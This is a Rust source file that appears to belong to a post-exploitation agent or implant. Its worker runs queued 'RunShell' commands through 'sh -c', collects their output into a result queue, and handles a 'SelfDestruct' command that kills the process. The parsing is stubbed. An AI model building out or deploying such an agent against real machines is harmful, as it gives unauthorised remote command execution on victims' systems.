use std::process::exit;

use crate::post::commands::{AgentCommand, ResultQueue};
use tokio::process::Command;
use tokio::sync::mpsc::Receiver;


pub fn _parse_command(raw: &str) -> Option<AgentCommand> {
    Some(AgentCommand::RunShell(raw.to_string())) // replace with real parsing
}

pub async fn _process_command(cmd: AgentCommand) -> Option<String>{

    todo!()
}

pub async fn run_command_worker(mut rx: Receiver<AgentCommand>, result_queue: ResultQueue) {
    while let Some(cmd) = rx.recv().await {
        let output = match cmd {
            AgentCommand::RunShell(cmd_str) => {
                match Command::new("sh").arg("-c").arg(cmd_str).output().await {
                    Ok(out) => String::from_utf8_lossy(&out.stdout).to_string(),
                    Err(e) => format!("Error: {}", e),
                }
            }
            AgentCommand::SelfDestruct => {
                // Perform any necessary cleanup here if needed
                // For a clean shutdown, ensure all important data is flushed/saved.
                // Drop or close any open resources (files, sockets, etc.) if needed.
                // If you want to forcefully terminate the entire process and all threads:
                exit(0); // This will immediately terminate the process.
            }
            AgentCommand::InvalidTask => "Invalid task".to_string(),
            _ => "Not implemented".to_string()
        };

        let mut lock = result_queue.lock().await;
        match &mut *lock {
            Some(vec) => vec.push(output),
            None => *lock = Some(vec![output]),
        };
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn tests_commands() {
        let output = match Command::new("sh")
            .arg("-c")
            .arg("echo \"hello world\"")
            .output().await {
            Ok(out) => String::from_utf8_lossy(&out.stdout).to_string(),
            Err(e) => format!("Error: {}", e)
        };
        dbg!(output);

        let output = match Command::new("sh")
            .arg("-c")
            .arg("cat test.txt")
            .output()
            .await {
            Ok(out) => String::from_utf8_lossy(&out.stdout).to_string(),
            Err(e) => format!("Error: {}", e)
        };
        dbg!(output);

    }
}
